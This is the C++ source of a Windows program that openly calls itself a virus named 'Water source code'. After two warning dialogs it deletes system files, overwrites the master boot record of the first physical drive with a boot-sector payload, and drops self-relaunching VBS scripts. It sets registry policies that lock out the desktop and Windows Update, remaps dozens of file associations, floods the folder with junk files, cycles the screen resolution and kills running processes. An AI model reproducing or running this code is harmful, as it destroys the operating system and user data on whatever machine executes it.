#include<iostream>
#include<windows.h>
#include<cstdio>
#include<fstream>
#include<winioctl.h>
#define N 800
#define in 1

using namespace std;

int main(void){
	HWND hWnd= GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);
	if(MessageBox(NULL,"这是一个计算机病毒程序，会对你的计算机造成特别大的伤害，此病毒也会更改主引导扇区与相关联进程 \r \n \
如果你想要测试它，请在虚拟上进行测试 \n \
如果对你的计算机造成了不好的影响，我一律不会负责","Water sourc code",MB_YESNO +48)==6){
		if(MessageBox(NULL,"This is a computer virus program, which will cause great harm to your computer. This virus will also change the main boot sector and associated processes. \r \n \
If you want to test it, test it on a virtual machine. \n \
If it has a bad effect on your computer, I will not be responsible for it.","Water source code",MB_YESNO +48)==6){
			system("md c:\\Water");
			system("del c:\\Windows\\system\\*.* /s/q");
			unsigned char scode[] =
			"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
			"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
			"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
			/*
			00000000  B81200 mov ax, 12H ; ah = 0, al = 12h (640 * 480)
			00000003  CD10 int 10h ; 进入图形显示方式，隐藏光标
			00000005  BD187C mov bp, Msg ; ES:BP = 串地址
			00000008  B91800 mov cx, 18h ; CX = 串长度
			0000000B  B80113 mov ax, 1301h ; AH = 13,  AL = 01h
			0000000E  BB0C00 mov bx, 000ch ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
			00000011  BA1D0E mov dx, 0e1dh ; dh行, dl列
			00000014  CD10 int 10h ; 10h 号中断
			00000016  E2FE loop $
			Msg: db "Your computer was died you are a loser" 
			*/
			int WINAPI WinMain(
			  HINSTANCE hInstance,  // handle to current instance
			  HINSTANCE hPrevInstance,  // handle to previous instance
			  LPSTR lpCmdLine,      // pointer to command line
			  int nCmdShow          // show state of window
			);
			{
				HANDLE hDevice;
				DWORD dwBytesWritten, dwBytesReturned;
				BYTE pMBR[512] = {0};
				// 重新构造MBR
				memcpy(pMBR, scode, sizeof(scode) - 1);
				pMBR[510] = 0x55;
				pMBR[511] = 0xAA;	
				hDevice = CreateFile
				(
				"\\\\.\\PHYSICALDRIVE0",
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				0,
				NULL
				);
				if (hDevice == INVALID_HANDLE_VALUE)
				  return -1;
				DeviceIoControl
				(
				hDevice, 
		FSCTL_LOCK_VOLUME, 
				NULL, 
				0, 
		NULL, 
				0, 
				&dwBytesReturned, 
				NULL
				);
				// 写入病毒内容
				WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
				DeviceIoControl
				(
				hDevice, 
				FSCTL_UNLOCK_VOLUME, 
				NULL, 
				0, 
				NULL, 
				0, 
				&dwBytesReturned, 
				NULL
				);
				CloseHandle(hDevice);
			}
			if(in==1){
				ofstream outfile("c:\\Water\\color.vbs");
				outfile << "Set objShell = CreateObject(\"Wscript.Shell\")"<<endl;
				outfile << "do"<<endl;
				outfile << "objshell.SendKeys\"^%i\""<<endl;
				outfile << "Wscript.Sleep 1500"<<endl;
				outfile << "loop"<<endl;
				outfile.close();
			}
			if(in==1){
				ofstream outfile("c:\\Water\\msg.vbs");
				outfile <<	"Set WshShell = WScript.CreateObject(\"WScript.Shell\")"<<endl;
				outfile << "WshShell.Run \"c:\\Water\\msg.vbs\""<<endl;
				outfile << "MsgBox \"你还要使用这个计算机吗？\",48,\"Water sourse code\""<<endl; 
				outfile.close();
			}
			system("start https://github.com/BC24-MEME/Water-source-code-Windows-Edition");
			Sleep(4000);
			system("start https://cn.bing.com/search?q=Water+source+code&qs=n&FORM=BESBTB&sp=-1&pq=water+source+&sc=8-13&sk=&cvid=3C8948367BA64E96A5AF5FE83A1645EF&ensearch=1");
			Sleep(4000);
			system("start https://cn.bing.com/search?q=C%2B%2B&qs=n&FORM=BESBTB&sp=-1&pq=c%2B%2B&sc=9-3&sk=&cvid=D29D1732DB3E4D52A0E66E1EFB670DCB&ensearch=1");
			Sleep(4000);
			system("start https://baike.baidu.com/item/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95/7612638?fromtitle=mbr&fromid=10473976&fr=aladdin");
			Sleep(4000); 
			if(in==1){
				system("start magnify");
				HWND hWnd= GetForegroundWindow();
				ShowWindow(hWnd, SW_HIDE);
				system("start c:\\Water\\color.vbs");
			}
			system("start c:\\Water\\msg.vbs");
			if(in==1){
				system("reg delete HKEY_CURRENT_USER/Software/Microsoft/Internet/Explorer/MenuExt");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoClose /t REG_DWORD /d 1 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v HideClock /t REG_DWORD /d 1 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v StartMenuLogOff /t REG_DWORD /d 1 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoWindowsUpdate /t REG_DWORD /d 01000000 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDesktop /t REG_DWORD /d 1 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f");
				system("reg add HKEY_CURRENT_USER\\SOFTWARW\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f");
				system("assoc .txt=exefile");
				system("assoc .exe=txtfile");
				system("assoc .htm=exefile");
				system("assoc .html=exefile");
				system("assoc .com=txtfile");
				system("assoc .gho=txtfile");
				system("assoc .rar=txtfile");
				system("assoc .zip=txtfile");
				system("assoc .chm=txtfile"); 
				system("assoc .jpg=txtfile"); 
				system("assoc .doc=exefile");
				system("assoc .ppt=txtfile");
				system("assoc .cmd=txtfile");
				system("assoc .bmp=txtfile");
				system("assoc .gif=txtfile");
				system("assoc .ico=txtfile");
				system("assoc .png=txtfile");
				system("assoc .jpeg=txtfile");
				system("assoc .jpe=txtfile");
				system("assoc .jfif=txtfile");
				system("assoc .fla=txtfile");
				system("assoc .swf=txtfile");
				system("assoc .avi=txtfile");
				system("assoc .mov=txtfile");
				system("assoc .asf=txtfile");
				system("assoc .wmv=txtfile");
				system("assoc .rm=txtfile");
				system("assoc .ra=txtfile");
				system("assoc .mvb=txtfile");
				system("assoc .flv=txtfile");
				system("assoc .mpg=txtfile");
				system("assoc .wav=txtfile");
				system("assoc .mpeg=txtfile");
				system("assoc .mp3=txtfile");
				system("assoc .mp4=txtfile");
				system("assoc .3gp=txtfile");
				system("assoc .msi=txtfile");
				system("assoc .dll=txtfile");
				system("assoc .ini=exefile");
				system("assoc .dat=txtfile");
				system("assoc .sys=txtfile");
				system("assoc .prx=txtfile");
				system("assoc .ttf=txtfile");
			}
			for (int i = 0; i < N; i++){
				char sMEME[100];
				sprintf(sMEME, "MEME%d.txt", i);
				FILE *fp = fopen(sMEME, "w+");
				fclose(fp);
			}
			//开始调整分辨率 
			for(int p=0 ; p < 19 ; p++){
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 1920;
					NewDevMode.dmPelsHeight = 1080;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(3000);
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 1600;
					NewDevMode.dmPelsHeight = 900;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(3000);
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 1280;
					NewDevMode.dmPelsHeight = 768;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(3000);
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 800;
					NewDevMode.dmPelsHeight = 600;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(3000);
			}
			for(int p=0 ; p < 19 ; p++){
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 1920;
					NewDevMode.dmPelsHeight = 1080;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(1000);
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 1600;
					NewDevMode.dmPelsHeight = 900;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(1000);
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 1280;
					NewDevMode.dmPelsHeight = 768;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(1000);
				if(in==1){
					DEVMODE NewDevMode;
					EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &NewDevMode);
					NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
					NewDevMode.dmPelsWidth = 800;
					NewDevMode.dmPelsHeight = 600;
					ChangeDisplaySettings(&NewDevMode, 0);
				}
				Sleep(1000);
			}
			system("taskkill /f /fi \"pid ne 1\"");
		}
	}
}
